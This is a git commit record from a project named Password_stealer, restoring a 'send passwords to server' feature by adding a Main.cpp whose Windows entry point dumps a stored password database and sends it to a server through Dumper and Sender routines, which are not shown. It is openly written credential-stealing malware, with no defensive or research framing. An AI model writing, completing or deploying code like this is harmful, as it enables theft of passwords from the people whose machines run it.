9abc520605ff241275c2c316992b24d62d63bace
Black-Frost <vovantiendung2001@gmail.com>
2021-01-30 01:01:07 +0700

    Revert "Revert "Add "send passwords to server" feature""
    This reverts commit 348689d6ca778eb1f001a1a3060afef223d1796c.

---
+++ Password_stealer/Main.cpp
@@ -0,0 +1,10 @@
+#include "Main.h"
+
+
+int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow)
+//int main()
+{
+	string dbPath = Dumper::dumpPassword();
+	Sender::sendPasswords(dbPath);
+	return 0;
+}
